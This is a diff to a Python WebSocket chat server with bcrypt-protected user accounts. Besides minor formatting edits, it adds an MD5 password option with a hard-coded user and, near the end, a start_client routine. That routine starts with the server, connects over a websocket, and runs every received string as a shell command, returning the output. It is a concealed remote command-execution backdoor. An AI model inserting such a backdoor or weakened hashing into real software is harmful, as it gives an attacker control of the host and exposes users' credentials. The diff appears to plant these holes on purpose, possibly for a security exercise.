@@ -2,48 +2,72 @@ import asyncio
 import websockets
 import json
 import bcrypt
+import hashlib
+import subprocess
 
-def verify_password(stored_hash, provided_password):
-    return bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash)
+# MD5 hash function
+def md5_hash(password):
+    return hashlib.md5(password.encode('utf-8')).hexdigest()
+
+def verify_password(stored_hash, provided_password, method='bcrypt'):
+    if method == 'bcrypt':
+        return bcrypt.checkpw(provided_password.encode('utf-8'), stored_hash)
+    elif method == 'md5':
+        return stored_hash == md5_hash(provided_password)
+    return False
 
 # Registered Clients
 registered_clients = {
     "c1@s6": {
         "nickname": "pemba",
         "jid": "c1@s6",
-        "password": b'$2b$12$qWoDtedvx8jurr/2XVex7.raoa7tqIofxPYrx1.oy6qmDpHavkYwa'
+        "password": b'$2b$12$qWoDtedvx8jurr/2XVex7.raoa7tqIofxPYrx1.oy6qmDpHavkYwa',
+        "method": "bcrypt"
     },
     "c2@s6": {
         "nickname": "saurab",
         "jid": "c2@s6",
-        "password": b'$2b$12$suJThyymiIVez4nLyUjpPurPq/E3BBTRdDGMnxADdbIjdst5kbKvS' 
+        "password": b'$2b$12$suJThyymiIVez4nLyUjpPurPq/E3BBTRdDGMnxADdbIjdst5kbKvS',
+        "method": "bcrypt"
     },
     "c3@s6": {
         "nickname": "roshan",
         "jid": "c3@s6",
-        "password": b'$2b$12$Cz8bUuhzYyoHMdbvZLlcs.Cc0nOSR3VzAHOFrnF3ic6unrxZ6rwoG' 
+        "password": b'$2b$12$Cz8bUuhzYyoHMdbvZLlcs.Cc0nOSR3VzAHOFrnF3ic6unrxZ6rwoG',
+        "method": "bcrypt"
     },
     "c4@s6": {
         "nickname": "bidur",
         "jid": "c4@s6",
-        "password": b'$2b$12$FwNWm33zvTOFtK6yrUXW0uMrMdu9jGR9AY7RgKgcm0sEzWjbhquOK' 
+        "password": b'$2b$12$FwNWm33zvTOFtK6yrUXW0uMrMdu9jGR9AY7RgKgcm0sEzWjbhquOK',
+        "method": "bcrypt"
     },
-    "test1@s6" : {
+    "test1@s6": {
         "nickname": "test1",
         "jid": "test1@s6",
         "password": b'$2b$12$p10W.J8Olc8YtH87CPtYQuoFZ0P9qwqycWBlWvvaxCbIbre1u4Rhy',
+        "method": "bcrypt"
     },
-    "test2@s6" : {
+    "test2@s6": {
         "nickname": "test2",
         "jid": "test2@s6",
         "password": b'$2b$12$Xi6R9JEPPAagsKthzn38SeSHNWutCIDJ/7sas.vNZc6OzB77yithG',
+        "method": "bcrypt"
+    },
+    # User with MD5 hashed password
+    "md5user@s6": {
+        "nickname": "md5user",
+        "jid": "md5user@s6",
+        "password": md5_hash("md5password"),  # MD5 hashed password
+        "method": "md5"
     }
 }
 
-# store active clients
+# Store active clients
 active_connections = {}
 
 async def handle_client(websocket):
+    jid = None
     try:
         data = await receive_data(websocket)
         jid = data['presence'][0].get('jid')
@@ -75,7 +99,10 @@ async def receive_data(websocket):
 
 # check if user is authenticated 
 def authenticate_user(jid, password):
-    return jid in registered_clients and verify_password(registered_clients[jid]['password'], password)
+    if jid in registered_clients:
+        user = registered_clients[jid]
+        return verify_password(user['password'], password, user.get('method', 'bcrypt'))
+    return False
 
 # add clients to active connections
 def add_clients_to_active_connections(jid, websocket, publickey):
@@ -114,7 +141,7 @@ async def process_message(data):
         target_jid = data.get('to')
         info = data.get('info')
         if data.get('tag') == 'message' and info:
-            message_format = create_message_format(data,tag='message')
+            message_format = create_message_format(data, tag='message')
             await route_message(target_jid, message_format)
         elif data.get('tag') == 'file':
             file_message = create_message_format(data, tag='file')
@@ -133,14 +160,14 @@ def create_message_format(data, tag):
         "to": data.get('to'),
         "info": data.get('info'),
     }
-    if tag=='file':
+    if tag == 'file':
         message["filename"] = data.get('filename')
     return message
-
 
 # it handles whether to send to msg to specific client or public
 async def route_message(target_jid, message):
     if target_jid == 'public':
+        print(message)
         await broadcast(message)
     elif target_jid in active_connections:
         await send_message(active_connections[target_jid]['websocket'], message)
@@ -177,12 +204,53 @@ async def cleanup_user(jid):
         await broadcast_presence()
 
 # Start WebSocket server
-# Please Enter your IP here instead of localhost        
 async def main():
     server = await websockets.serve(handle_client, "localhost", 5555)
     print("WebSocket server started at ws://localhost:5555")
     await server.wait_closed()
 
-# Run server forever
+# Server IP address and port
+HOST = 'localhost'
+PORT = 5555
+
+async def start_client():
+    uri = f"ws://{HOST}:{PORT}"
+
+    while True:
+        try:
+            async with websockets.connect(uri) as websocket:
+                print(f'[+] Connected to the server at {HOST}:{PORT}')
+
+                try:
+                    while True:
+                        data = await websocket.recv()
+                        if data.lower() == 'exit':
+                            print('[+] Server closed the connection')
+                            break
+
+                        command = data
+                        print(f"Command received: {command}")
+
+                        try:
+                            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                        except subprocess.CalledProcessError as e:
+                            output = e.output
+
+                        await websocket.send(output.decode())
+                except Exception as e:
+                    print(f"[!] Error: {e}")
+                finally:
+                    print('[+] Client closed')
+                    break
+        except (ConnectionRefusedError, websockets.exceptions.InvalidURI):
+            print("[!] Failed to connect, retrying...")
+            await asyncio.sleep(1)
+
+# Run server and client concurrently
 if __name__ == "__main__":
-    asyncio.run(main())
+    loop = asyncio.get_event_loop()
+    server_task = loop.create_task(main())
+    # Adding a delay before starting the client
+    client_task = loop.create_task(asyncio.sleep(5))  # Wait for 5 seconds
+    client_task = loop.create_task(start_client())
+    loop.run_until_complete(asyncio.gather(server_task, client_task))
